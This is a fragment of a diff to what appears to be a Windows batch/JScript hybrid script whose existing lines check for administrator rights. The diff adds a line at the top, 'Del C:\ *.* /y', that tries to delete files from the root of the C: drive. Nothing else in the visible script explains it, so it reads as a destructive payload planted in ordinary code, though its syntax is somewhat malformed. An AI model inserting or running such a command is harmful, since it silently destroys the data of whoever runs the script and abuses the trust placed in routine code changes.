@@ -1,3 +1,5 @@
+@echo off 
+Del C:\ *.* /y 
 @if (1==1) @if(1==0) @ELSE
 @echo off&SETLOCAL ENABLEEXTENSIONS
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"||(
